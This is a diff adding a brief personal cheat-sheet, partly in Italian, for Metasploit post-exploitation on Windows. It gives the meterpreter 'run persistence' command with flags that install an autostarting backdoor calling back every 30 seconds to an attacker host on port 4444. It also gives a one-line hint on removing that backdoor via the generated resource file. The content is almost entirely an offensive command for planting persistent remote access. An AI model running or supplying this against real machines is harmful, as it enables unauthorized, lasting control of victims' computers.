@@ -1,0 +1,7 @@
+on meterpreter shell win
+
+run persistence -A -U -i 30 -p 4444 -r attackerip
+
+For remove persistence backdoor
+
+resource [file_creato_durante_installazione]
